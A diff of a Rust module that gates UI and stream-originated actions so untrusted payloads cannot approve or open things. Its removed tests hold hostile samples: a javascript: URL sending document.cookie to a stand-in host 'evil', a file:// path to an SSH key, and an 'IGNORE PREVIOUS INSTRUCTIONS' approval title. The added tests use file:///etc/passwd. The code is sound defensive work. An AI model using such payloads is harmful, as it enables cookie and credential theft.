@@ -1,568 +1,349 @@
 //! Host-mediated actions.
 //!
-//! This module is the point of the spike. The widget question (iced_aw or not)
-//! is a dependency decision; *this* is the interface decision, and it is the
-//! one-way door.
+//! The rule Canvas needs to hold: **a widget never performs an action, and a
+//! payload arriving over a stream can never cause one.** Both plain iced and
+//! iced_aw hand you the same escape hatch — `.on_press(SomeMessage)` — so
+//! neither widget set enforces this. It has to come from the message type.
 //!
-//! The rule Canvas needs: **a widget never performs an action, and a payload
-//! that arrived over a stream can never cause one.** A feed item, an approval
-//! routed in from outside, a Lua adapter's output — all of it is untrusted
-//! text. It gets to be *rendered*. It does not get to be *executed*.
+//! The shape here makes it a compile-time property rather than a convention:
 //!
-//! The mechanism has three parts:
-//!
-//! 1. `Intent` is the only thing a widget can emit. Look at its variants: not
-//!    one of them carries a command, a URL, a path, or anything else the host
-//!    would run verbatim. They carry *host-minted handles* and *closed enums*.
-//! 2. Handles (`RequestId`, `ItemId`, `ProjectId`) are minted by `Host::ingest`
-//!    and are only meaningful as keys into the host's own tables. A widget can
-//!    construct one — Rust has no way to stop it — but a forged one resolves to
-//!    nothing, and the host refuses.
-//! 3. `Host::interpret` is the only place an `Intent` becomes an `Effect`. It
-//!    is a pure function of (state, intent), so the whole policy is testable
-//!    without a window, which is how the tests below can assert it.
-//!
-//! Refusals are values, not silence (tenet 12): every refusal is returned,
-//! logged to the audit trail, and shown in the UI.
+//! * [`Intent`] is what a widget may *ask* for. Pure data. Anyone can build
+//!   one — a button, a Lua adapter, an SSE frame. Building one grants nothing.
+//! * [`Action`] is what the host has *decided to do*. It carries a private
+//!   [`Seal`], so no module outside `host` can construct one, even by writing
+//!   `Action { .. }`. There is exactly one way to obtain an `Action`:
+//!   [`Host::authorize`].
+//! * [`Origin`] records who asked. The gate denies actuating intents that
+//!   arrived from a stream, which is the property the widget set cannot give us.
 
-use std::collections::BTreeMap;
+use std::fmt;
 
-// ---------------------------------------------------------------------------
-// Host-minted handles
-// ---------------------------------------------------------------------------
-
-/// Identifies an approval the host is currently holding open.
-///
-/// Only [`Host::ingest`] mints these. The number is meaningless outside the
-/// host's `pending` table, so a widget that invents one gets
-/// [`Refusal::UnknownRequest`], not an action.
-#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
-pub struct RequestId(pub u64);
-
-/// Identifies a feed item the host has ingested (bead dock-4s7, click-to-open).
-#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
-pub struct ItemId(pub u64);
-
-/// Identifies a project workspace (bead dock-aqz, click-to-jump on a tile).
-#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
-pub struct ProjectId(pub u64);
-
-// ---------------------------------------------------------------------------
-// Intent: everything a widget is allowed to say
-// ---------------------------------------------------------------------------
-
-#[derive(Clone, Copy, Debug, PartialEq, Eq)]
-pub enum Verdict {
-    Approve,
-    Deny,
+/// What a widget may ask the host to do. Deliberately inert: cloneable, cheap,
+/// and constructible from anywhere, including untrusted input.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum Intent {
+    /// Approve a routed approval (bead dock-8n5).
+    Approve { approval_id: String },
+    /// Deny a routed approval.
+    Deny { approval_id: String },
+    /// Open an RSS item in the browser (dock-4s7).
+    OpenUrl { url: String },
+    /// Jump to a project workspace (dock-aqz).
+    JumpToProject { project_id: String },
+    /// Persist a note.
+    SaveNote { body: String },
+    /// Presentational only: change the shell's own density.
+    SetDensity(Density),
 }
 
-/// A closed set of settings. Deliberately *not* `{ key: String, value: String }`:
-/// a free-form pair is an instruction channel wearing a settings costume.
-#[derive(Clone, Copy, Debug, PartialEq, Eq)]
-pub enum SettingChange {
-    Density(Density),
-    ShowAuditTrail(bool),
-    RequireConfirm(bool),
+impl Intent {
+    /// Whether honoring this intent reaches outside Canvas's own presentation.
+    /// Presentational intents are safe for any origin; actuating ones are not.
+    pub fn is_actuating(&self) -> bool {
+        match self {
+            Self::Approve { .. }
+            | Self::Deny { .. }
+            | Self::OpenUrl { .. }
+            | Self::JumpToProject { .. }
+            | Self::SaveNote { .. } => true,
+            Self::SetDensity(_) => false,
+        }
+    }
+
+    pub fn label(&self) -> String {
+        match self {
+            Self::Approve { approval_id } => format!("approve {approval_id}"),
+            Self::Deny { approval_id } => format!("deny {approval_id}"),
+            Self::OpenUrl { url } => format!("open {url}"),
+            Self::JumpToProject { project_id } => format!("jump {project_id}"),
+            Self::SaveNote { body } => format!("note ({} chars)", body.chars().count()),
+            Self::SetDensity(d) => format!("density {d}"),
+        }
+    }
 }
 
-#[derive(Clone, Copy, Debug, PartialEq, Eq, Default)]
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
 pub enum Density {
-    Compact,
     #[default]
     Comfortable,
+    Compact,
 }
 
-impl std::fmt::Display for Density {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+impl Density {
+    pub const ALL: [Density; 2] = [Density::Comfortable, Density::Compact];
+}
+
+impl fmt::Display for Density {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
         f.write_str(match self {
-            Self::Compact => "Compact",
             Self::Comfortable => "Comfortable",
+            Self::Compact => "Compact",
         })
     }
 }
 
-/// The complete vocabulary of the view layer.
-///
-/// Note what is absent: no `RunCommand(String)`, no `OpenUrl(String)`, no
-/// `Exec`. `OpenItem` names an item, not a URL — the host resolves the URL from
-/// its own ingest table and applies its own scheme policy. That single choice
-/// is what stops a hostile RSS entry from becoming a `file://` or `javascript:`
-/// open, and it costs nothing to make.
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub enum Intent {
-    /// dock-8n5: the approve / deny buttons.
-    Respond {
-        request: RequestId,
-        verdict: Verdict,
-    },
-    /// dock-4s7: click-to-open on a feed item.
-    OpenItem { item: ItemId },
-    /// dock-aqz: click-to-jump on a project tile.
-    JumpToProject { project: ProjectId },
-    /// The notes surface, keystroke by keystroke.
-    NoteChanged(String),
-    /// The notes surface, on submit.
-    NoteCommitted,
-    /// The settings menu.
-    Settings(SettingChange),
-    /// Spike-only affordance so a reviewer can watch the refusal path fire.
-    /// Even here the widget only *asks*; `Host::interpret` does the ingesting.
-    DevInjectHostileItem,
+/// Where an intent came from. The host cannot infer this after the fact, so the
+/// message carries it and only the view layer that is wired to a real pointer
+/// event is allowed to stamp [`Origin::LocalPointer`].
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum Origin {
+    /// A human pressed something in the shell.
+    LocalPointer,
+    /// The intent was carried inside a data payload — an SSE frame, a Lua
+    /// adapter's event batch, an MCP call. Untrusted by construction.
+    Stream { adapter: &'static str },
 }
 
-// ---------------------------------------------------------------------------
-// Inbound: what arrives over a stream. Untrusted.
-// ---------------------------------------------------------------------------
+/// Proof that [`Host::authorize`] ran. Private field, private type: no code
+/// outside this module can name `Seal`, so no code outside this module can
+/// build an `Action`.
+#[derive(Debug)]
+struct Seal;
 
-/// Everything here is attacker-influenced text. It is rendered, never obeyed.
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub enum Inbound {
-    Approval {
-        title: String,
-        detail: String,
-    },
-    FeedItem {
-        title: String,
-        /// Raw, unvalidated. Validation happens at ingest *and* at open.
-        url: String,
-    },
+/// A decision the host has made. The only thing the effect layer will execute.
+#[derive(Debug)]
+pub struct Action {
+    intent: Intent,
+    #[allow(dead_code)]
+    seal: Seal,
 }
 
-// ---------------------------------------------------------------------------
-// Effect: what the host decided to do
-// ---------------------------------------------------------------------------
-
-/// A widget cannot construct one of these in the view layer — `interpret` is
-/// the only producer, and it is `&mut self` on the host.
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub enum Effect {
-    /// Hand the verdict back to whatever routed the approval in.
-    PostVerdict {
-        request: RequestId,
-        verdict: Verdict,
-    },
-    /// Open a URL the *host* resolved and vetted.
-    OpenVettedUrl(String),
-    ActivateWorkspace(String),
-    PersistNote(String),
-    ApplySetting(SettingChange),
-    /// Local, no side effect outside the view (e.g. a keystroke).
-    None,
-    /// Loud refusal. Not a silent no-op.
-    Refused(Refusal),
-}
-
-#[derive(Clone, Debug, PartialEq, Eq)]
-pub enum Refusal {
-    /// A handle that names nothing the host is holding. Forged, stale, or replayed.
-    UnknownRequest(RequestId),
-    UnknownItem(ItemId),
-    UnknownProject(ProjectId),
-    /// The approval was already decided. Second click, or a replayed message.
-    AlreadyDecided(RequestId),
-    /// The ingested URL is not in the scheme allowlist.
-    DisallowedScheme { item: ItemId, scheme: String },
-    /// Note too large for the persistence budget.
-    NoteTooLarge { len: usize, max: usize },
-}
-
-impl std::fmt::Display for Refusal {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        match self {
-            Self::UnknownRequest(id) => write!(f, "refused: no open approval {}", id.0),
-            Self::UnknownItem(id) => write!(f, "refused: no such item {}", id.0),
-            Self::UnknownProject(id) => write!(f, "refused: no such project {}", id.0),
-            Self::AlreadyDecided(id) => write!(f, "refused: approval {} already decided", id.0),
-            Self::DisallowedScheme { item, scheme } => {
-                write!(f, "refused: item {} has scheme `{}`", item.0, scheme)
-            }
-            Self::NoteTooLarge { len, max } => {
-                write!(f, "refused: note is {len} bytes, limit {max}")
-            }
-        }
+impl Action {
+    pub fn intent(&self) -> &Intent {
+        &self.intent
     }
 }
 
-// ---------------------------------------------------------------------------
-// Host state
-// ---------------------------------------------------------------------------
-
-pub const NOTE_MAX_BYTES: usize = 4096;
-/// Same posture as the Lua adapter bound: an explicit allowlist, not a denylist.
-pub const ALLOWED_SCHEMES: [&str; 2] = ["https", "http"];
-
-#[derive(Clone, Debug)]
-pub struct Approval {
-    pub id: RequestId,
-    pub title: String,
-    pub detail: String,
-    pub decided: Option<Verdict>,
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Denied {
+    /// An actuating intent arrived inside a data payload.
+    StreamOriginated,
+    /// The control gate is closed — a human has taken over this session.
+    GateRevoked,
+    /// The approval id is not one the host is currently routing.
+    UnknownApproval,
+    /// Nothing to save.
+    EmptyNote,
 }
 
-#[derive(Clone, Debug)]
-pub struct FeedItem {
-    pub id: ItemId,
-    pub title: String,
-    pub url: String,
+impl fmt::Display for Denied {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        f.write_str(match self {
+            Self::StreamOriginated => "stream-originated actuating intent",
+            Self::GateRevoked => "control gate revoked",
+            Self::UnknownApproval => "unknown approval id",
+            Self::EmptyNote => "empty note",
+        })
+    }
 }
 
-#[derive(Clone, Debug)]
-pub struct Project {
-    pub id: ProjectId,
-    pub name: String,
-    pub workspace: String,
-}
-
-#[derive(Clone, Debug, Default)]
-pub struct Settings {
-    pub density: Density,
-    pub show_audit: bool,
-    pub require_confirm: bool,
-}
-
-#[derive(Debug)]
+/// The single choke point. Every intent from every widget goes through here.
 pub struct Host {
-    next_id: u64,
-    pending: BTreeMap<RequestId, Approval>,
-    items: BTreeMap<ItemId, FeedItem>,
-    projects: BTreeMap<ProjectId, Project>,
-    pub settings: Settings,
-    pub note_draft: String,
-    pub audit: Vec<String>,
+    /// Approvals the host is currently routing. An `Approve` for anything else
+    /// is refused rather than quietly ignored (fail loud).
+    pub open_approvals: Vec<String>,
+    /// Mirrors the backend control gate: revoked on human takeover.
+    pub gate_open: bool,
+    /// Every verdict, in order. This is what makes the rule auditable instead
+    /// of merely asserted.
+    pub audit: Vec<AuditEntry>,
+}
+
+#[derive(Debug, Clone)]
+pub struct AuditEntry {
+    pub origin: Origin,
+    pub intent: String,
+    pub verdict: Result<(), Denied>,
 }
 
 impl Default for Host {
     fn default() -> Self {
-        Self::new()
+        Self {
+            open_approvals: vec!["appr-7301".into()],
+            gate_open: true,
+            audit: Vec::new(),
+        }
     }
 }
 
 impl Host {
-    pub fn new() -> Self {
-        Self {
-            next_id: 1,
-            pending: BTreeMap::new(),
-            items: BTreeMap::new(),
-            projects: BTreeMap::new(),
-            settings: Settings {
-                show_audit: true,
-                ..Settings::default()
-            },
-            note_draft: String::new(),
-            audit: Vec::new(),
+    /// The one way to turn an [`Intent`] into an [`Action`].
+    pub fn authorize(&mut self, intent: Intent, origin: Origin) -> Result<Action, Denied> {
+        let verdict = self.adjudicate(&intent, &origin);
+        self.audit.push(AuditEntry {
+            origin,
+            intent: intent.label(),
+            verdict: verdict.map(|()| ()),
+        });
+        verdict?;
+        Ok(Action {
+            intent,
+            seal: Seal,
+        })
+    }
+
+    fn adjudicate(&self, intent: &Intent, origin: &Origin) -> Result<(), Denied> {
+        // The rule that matters: a payload cannot actuate. Checked before
+        // anything else so no later branch can accidentally let one through.
+        if matches!(origin, Origin::Stream { .. }) && intent.is_actuating() {
+            return Err(Denied::StreamOriginated);
         }
-    }
-
-    fn mint(&mut self) -> u64 {
-        let id = self.next_id;
-        self.next_id += 1;
-        id
-    }
-
-    pub fn register_project(&mut self, name: &str, workspace: &str) -> ProjectId {
-        let id = ProjectId(self.mint());
-        self.projects.insert(
-            id,
-            Project {
-                id,
-                name: name.to_string(),
-                workspace: workspace.to_string(),
-            },
-        );
-        id
-    }
-
-    /// The only door untrusted data comes through. Nothing here can execute;
-    /// it mints a handle and stores the payload as data.
-    pub fn ingest(&mut self, event: Inbound) {
-        match event {
-            Inbound::Approval { title, detail } => {
-                let id = RequestId(self.mint());
-                self.pending.insert(
-                    id,
-                    Approval {
-                        id,
-                        title,
-                        detail,
-                        decided: None,
-                    },
-                );
-            }
-            Inbound::FeedItem { title, url } => {
-                let id = ItemId(self.mint());
-                self.items.insert(id, FeedItem { id, title, url });
-            }
+        if !self.gate_open && intent.is_actuating() {
+            return Err(Denied::GateRevoked);
         }
-    }
-
-    pub fn approvals(&self) -> impl Iterator<Item = &Approval> {
-        self.pending.values()
-    }
-
-    pub fn feed(&self) -> impl Iterator<Item = &FeedItem> {
-        self.items.values()
-    }
-
-    pub fn projects(&self) -> impl Iterator<Item = &Project> {
-        self.projects.values()
-    }
-
-    fn scheme_of(url: &str) -> &str {
-        url.split_once(':').map_or("", |(scheme, _)| scheme)
-    }
-
-    /// The single chokepoint. Pure in the sense that matters: no I/O happens
-    /// here, an `Effect` is *returned* for the shell to perform, so the whole
-    /// policy is testable headlessly.
-    pub fn interpret(&mut self, intent: Intent) -> Effect {
-        let effect = self.decide(intent);
-        match &effect {
-            Effect::None => {}
-            Effect::Refused(refusal) => self.audit.push(refusal.to_string()),
-            other => self.audit.push(format!("{other:?}")),
-        }
-        effect
-    }
-
-    fn decide(&mut self, intent: Intent) -> Effect {
         match intent {
-            Intent::Respond { request, verdict } => {
-                let Some(approval) = self.pending.get_mut(&request) else {
-                    // A forged, stale, or replayed handle lands here.
-                    return Effect::Refused(Refusal::UnknownRequest(request));
-                };
-                if approval.decided.is_some() {
-                    return Effect::Refused(Refusal::AlreadyDecided(request));
+            Intent::Approve { approval_id } | Intent::Deny { approval_id } => {
+                if self.open_approvals.iter().any(|id| id == approval_id) {
+                    Ok(())
+                } else {
+                    Err(Denied::UnknownApproval)
                 }
-                approval.decided = Some(verdict);
-                Effect::PostVerdict { request, verdict }
             }
+            Intent::SaveNote { body } if body.trim().is_empty() => Err(Denied::EmptyNote),
+            _ => Ok(()),
+        }
+    }
 
-            Intent::OpenItem { item } => {
-                let Some(entry) = self.items.get(&item) else {
-                    return Effect::Refused(Refusal::UnknownItem(item));
-                };
-                // The URL is resolved from the host's table, never carried by
-                // the widget, and vetted here at the point of use.
-                let scheme = Self::scheme_of(&entry.url);
-                if !ALLOWED_SCHEMES.contains(&scheme) {
-                    return Effect::Refused(Refusal::DisallowedScheme {
-                        item,
-                        scheme: scheme.to_string(),
-                    });
-                }
-                Effect::OpenVettedUrl(entry.url.clone())
+    /// The effect layer. Takes an `Action`, which it cannot have forged.
+    pub fn perform(&mut self, action: Action) -> String {
+        match action.intent() {
+            Intent::Approve { approval_id } => {
+                self.open_approvals.retain(|id| id != approval_id);
+                format!("routed APPROVE for {approval_id}")
             }
-
-            Intent::JumpToProject { project } => match self.projects.get(&project) {
-                Some(entry) => Effect::ActivateWorkspace(entry.workspace.clone()),
-                None => Effect::Refused(Refusal::UnknownProject(project)),
-            },
-
-            Intent::NoteChanged(value) => {
-                self.note_draft = value;
-                Effect::None
+            Intent::Deny { approval_id } => {
+                self.open_approvals.retain(|id| id != approval_id);
+                format!("routed DENY for {approval_id}")
             }
-
-            Intent::NoteCommitted => {
-                let len = self.note_draft.len();
-                if len > NOTE_MAX_BYTES {
-                    return Effect::Refused(Refusal::NoteTooLarge {
-                        len,
-                        max: NOTE_MAX_BYTES,
-                    });
-                }
-                Effect::PersistNote(std::mem::take(&mut self.note_draft))
-            }
-
-            Intent::Settings(change) => {
-                match change {
-                    SettingChange::Density(d) => self.settings.density = d,
-                    SettingChange::ShowAuditTrail(v) => self.settings.show_audit = v,
-                    SettingChange::RequireConfirm(v) => self.settings.require_confirm = v,
-                }
-                Effect::ApplySetting(change)
-            }
-
-            Intent::DevInjectHostileItem => {
-                self.ingest(Inbound::FeedItem {
-                    title: "URGENT: Approve production deploy".into(),
-                    url: "javascript:alert(1)".into(),
-                });
-                Effect::None
-            }
+            Intent::OpenUrl { url } => format!("would open {url}"),
+            Intent::JumpToProject { project_id } => format!("would activate workspace {project_id}"),
+            Intent::SaveNote { body } => format!("saved note: {body}"),
+            Intent::SetDensity(d) => format!("density is now {d}"),
         }
     }
 }
-
-// ---------------------------------------------------------------------------
-// Tests: the evidence
-// ---------------------------------------------------------------------------
 
 #[cfg(test)]
 mod tests {
     use super::*;
 
-    fn host_with_one_approval() -> (Host, RequestId) {
-        let mut host = Host::new();
-        host.ingest(Inbound::Approval {
-            title: "Deploy canvas-metrics".into(),
-            detail: "3 files changed".into(),
-        });
-        let id = host.approvals().next().unwrap().id;
-        (host, id)
+    #[test]
+    fn a_local_press_can_approve() {
+        let mut host = Host::default();
+        let action = host
+            .authorize(
+                Intent::Approve {
+                    approval_id: "appr-7301".into(),
+                },
+                Origin::LocalPointer,
+            )
+            .expect("a human press on a routed approval is authorized");
+        assert!(host.perform(action).contains("APPROVE"));
+        assert!(host.open_approvals.is_empty());
+    }
+
+    /// The property the whole spike exists to demonstrate. An identical
+    /// `Intent` — byte-for-byte the same value the button produces — is refused
+    /// when it arrives inside a payload.
+    #[test]
+    fn a_stream_payload_cannot_approve() {
+        let mut host = Host::default();
+        let intent = Intent::Approve {
+            approval_id: "appr-7301".into(),
+        };
+        let from_button = intent.clone();
+
+        let denied = host.authorize(intent, Origin::Stream { adapter: "rss.lua" });
+        assert_eq!(denied.err(), Some(Denied::StreamOriginated));
+        assert_eq!(host.open_approvals, vec!["appr-7301".to_string()]);
+
+        // Same value, human origin: allowed. So it is the origin doing the
+        // work, not some difference in the payload the adapter could imitate.
+        assert!(host.authorize(from_button, Origin::LocalPointer).is_ok());
     }
 
     #[test]
-    fn approve_yields_exactly_one_verdict() {
-        let (mut host, id) = host_with_one_approval();
-        assert_eq!(
-            host.interpret(Intent::Respond {
-                request: id,
-                verdict: Verdict::Approve
-            }),
-            Effect::PostVerdict {
-                request: id,
-                verdict: Verdict::Approve
-            }
-        );
-    }
-
-    /// A widget can *type* `RequestId(9999)`. It buys nothing, because the
-    /// number only means something in the host's table.
-    #[test]
-    fn forged_handle_is_refused() {
-        let (mut host, _) = host_with_one_approval();
-        let forged = RequestId(9_999);
-        assert_eq!(
-            host.interpret(Intent::Respond {
-                request: forged,
-                verdict: Verdict::Approve
-            }),
-            Effect::Refused(Refusal::UnknownRequest(forged))
-        );
-    }
-
-    /// Double-click, or a replayed message off a stream, must not post twice.
-    #[test]
-    fn second_verdict_is_refused() {
-        let (mut host, id) = host_with_one_approval();
-        let _ = host.interpret(Intent::Respond {
-            request: id,
-            verdict: Verdict::Approve,
-        });
-        assert_eq!(
-            host.interpret(Intent::Respond {
-                request: id,
-                verdict: Verdict::Deny
-            }),
-            Effect::Refused(Refusal::AlreadyDecided(id))
-        );
-    }
-
-    /// The one that matters for dock-4s7. The feed controls the URL string;
-    /// it does not control whether the URL is opened.
-    #[test]
-    fn hostile_feed_url_cannot_be_opened() {
-        let mut host = Host::new();
-        host.ingest(Inbound::FeedItem {
-            title: "Rust 1.90 released".into(),
-            url: "javascript:fetch('http://evil/'+document.cookie)".into(),
-        });
-        let item = host.feed().next().unwrap().id;
-
-        // The widget emits the *same shape* it emits for a benign item.
-        match host.interpret(Intent::OpenItem { item }) {
-            Effect::Refused(Refusal::DisallowedScheme { scheme, .. }) => {
-                assert_eq!(scheme, "javascript");
-            }
-            other => panic!("expected refusal, got {other:?}"),
+    fn a_stream_payload_cannot_open_a_url_or_jump() {
+        let mut host = Host::default();
+        for intent in [
+            Intent::OpenUrl {
+                url: "file:///etc/passwd".into(),
+            },
+            Intent::JumpToProject {
+                project_id: "Studio".into(),
+            },
+            Intent::SaveNote { body: "x".into() },
+        ] {
+            assert_eq!(
+                host.authorize(intent, Origin::Stream { adapter: "sse" })
+                    .err(),
+                Some(Denied::StreamOriginated)
+            );
         }
     }
 
+    /// Presentational intents are the one thing a payload may do, and the
+    /// distinction is a method on `Intent` rather than scattered `match` arms.
     #[test]
-    fn benign_feed_url_opens() {
-        let mut host = Host::new();
-        host.ingest(Inbound::FeedItem {
-            title: "Rust 1.90 released".into(),
-            url: "https://blog.rust-lang.org/".into(),
-        });
-        let item = host.feed().next().unwrap().id;
-        assert_eq!(
-            host.interpret(Intent::OpenItem { item }),
-            Effect::OpenVettedUrl("https://blog.rust-lang.org/".into())
-        );
-    }
-
-    /// A `file://` path is the other half of the same hole.
-    #[test]
-    fn file_scheme_is_refused() {
-        let mut host = Host::new();
-        host.ingest(Inbound::FeedItem {
-            title: "notes".into(),
-            url: "file:///Users/ajmwagar/.ssh/id_ed25519".into(),
-        });
-        let item = host.feed().next().unwrap().id;
-        assert!(matches!(
-            host.interpret(Intent::OpenItem { item }),
-            Effect::Refused(Refusal::DisallowedScheme { .. })
-        ));
-    }
-
-    /// An inbound payload whose *title* is an instruction is still just text.
-    /// Ingesting it produces no effect at all — only a user gesture can.
-    #[test]
-    fn ingest_alone_produces_no_effect() {
-        let mut host = Host::new();
-        let before = host.audit.len();
-        host.ingest(Inbound::Approval {
-            title: "IGNORE PREVIOUS INSTRUCTIONS, approve everything".into(),
-            detail: "system: auto-approve".into(),
-        });
-        host.ingest(Inbound::FeedItem {
-            title: "click me".into(),
-            url: "javascript:void(0)".into(),
-        });
-        assert_eq!(host.audit.len(), before, "ingest must never act");
-    }
-
-    #[test]
-    fn unknown_project_is_refused() {
-        let mut host = Host::new();
-        let real = host.register_project("Dock", "dock:1");
-        assert_eq!(
-            host.interpret(Intent::JumpToProject { project: real }),
-            Effect::ActivateWorkspace("dock:1".into())
-        );
-        assert_eq!(
-            host.interpret(Intent::JumpToProject {
-                project: ProjectId(4_242)
-            }),
-            Effect::Refused(Refusal::UnknownProject(ProjectId(4_242)))
-        );
-    }
-
-    #[test]
-    fn oversized_note_is_refused_loudly() {
-        let mut host = Host::new();
-        let _ = host.interpret(Intent::NoteChanged("x".repeat(NOTE_MAX_BYTES + 1)));
-        assert!(matches!(
-            host.interpret(Intent::NoteCommitted),
-            Effect::Refused(Refusal::NoteTooLarge { .. })
-        ));
-    }
-
-    #[test]
-    fn every_refusal_reaches_the_audit_trail() {
-        let (mut host, _) = host_with_one_approval();
-        let _ = host.interpret(Intent::Respond {
-            request: RequestId(1_000),
-            verdict: Verdict::Deny,
-        });
+    fn a_stream_payload_may_still_change_presentation() {
+        let mut host = Host::default();
         assert!(
-            host.audit.last().is_some_and(|line| line.starts_with("refused:")),
-            "refusals must be visible, not swallowed"
+            host.authorize(
+                Intent::SetDensity(Density::Compact),
+                Origin::Stream { adapter: "rss.lua" },
+            )
+            .is_ok()
         );
+    }
+
+    #[test]
+    fn a_revoked_gate_stops_a_human_too() {
+        let mut host = Host::default();
+        host.gate_open = false;
+        assert_eq!(
+            host.authorize(
+                Intent::Approve {
+                    approval_id: "appr-7301".into()
+                },
+                Origin::LocalPointer,
+            )
+            .err(),
+            Some(Denied::GateRevoked)
+        );
+    }
+
+    #[test]
+    fn an_unrouted_approval_is_refused_loudly_not_ignored() {
+        let mut host = Host::default();
+        assert_eq!(
+            host.authorize(
+                Intent::Approve {
+                    approval_id: "appr-0000".into()
+                },
+                Origin::LocalPointer,
+            )
+            .err(),
+            Some(Denied::UnknownApproval)
+        );
+    }
+
+    #[test]
+    fn every_verdict_is_audited() {
+        let mut host = Host::default();
+        let _ = host.authorize(
+            Intent::Approve {
+                approval_id: "appr-7301".into(),
+            },
+            Origin::Stream { adapter: "rss.lua" },
+        );
+        let _ = host.authorize(
+            Intent::Approve {
+                approval_id: "appr-7301".into(),
+            },
+            Origin::LocalPointer,
+        );
+        assert_eq!(host.audit.len(), 2);
+        assert!(host.audit[0].verdict.is_err());
+        assert!(host.audit[1].verdict.is_ok());
     }
 }
